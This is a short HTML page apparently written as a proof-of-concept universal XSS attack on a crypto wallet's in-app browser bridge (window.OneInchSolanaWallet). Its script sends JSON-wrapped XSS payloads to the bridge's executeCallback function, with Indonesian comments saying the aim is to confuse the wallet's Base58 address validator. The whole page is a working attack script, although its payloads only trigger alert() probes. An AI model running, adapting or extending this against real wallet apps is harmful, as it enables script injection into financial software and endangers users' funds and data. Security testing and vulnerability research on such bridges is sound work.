<!DOCTYPE html>
<html>
<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
    <h3>Final UXSS Bypass Attempt</h3>
    <button onclick="runBypass()" style="padding: 15px; width: 100%; cursor: pointer;">TRY JSON BYPASS</button>
    <div id="log" style="margin-top: 20px; font-size: 10px; border-top: 1px solid #333;"></div>

    <script>
    function runBypass() {
        const target = window.OneInchSolanaWallet;
        const log = document.getElementById('log');

        // Mencoba mengirim objek alih-alih string untuk membingungkan validator Base58
        const complexPayloads = [
            { address: "11111111111111111111111111111111", script: "<img src=x onerror=alert(1)>" },
            { type: "test", data: "javascript:alert(document.domain)" }
        ];

        complexPayloads.forEach(p => {
            try {
                // Memanggil dengan objek JSON
                target.executeCallback("any_id", JSON.stringify(p), true);
                log.innerHTML += `> Sent JSON payload to executeCallback\n`;
            } catch(e) {
                log.innerHTML += `> Failed: ${e.message}\n`;
            }
        });
    }
    </script>
</body>
</html>
